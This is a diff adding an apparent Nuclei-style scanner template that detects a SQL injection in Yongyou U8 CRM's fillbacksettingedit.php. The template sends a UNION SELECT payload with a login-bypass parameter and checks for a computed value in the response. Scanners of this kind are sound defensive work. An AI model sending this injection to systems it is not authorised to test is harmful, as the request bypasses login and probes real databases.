@@ -1,0 +1,28 @@
+id: yongyou-u8-crm-fillbacksetting-sqli
+info:
+  name: Yongyou U8 CRM fillbacksetting.php SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: Yongyou U8 CRM
+variables:
+  t1: "{{rand_int(111,456)}}"
+http:
+  - raw:
+      - |
+        GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,POWER({{t1}},3),NULL,NULL--+ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: PHPSESSID=bgsesstimeout-;
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"src_fld\":"
+          - "\"businesInfo\""
+      - type: dsl
+        dsl:
+          - contains(body, t1)
+      - type: status
+        status:
+          - 200
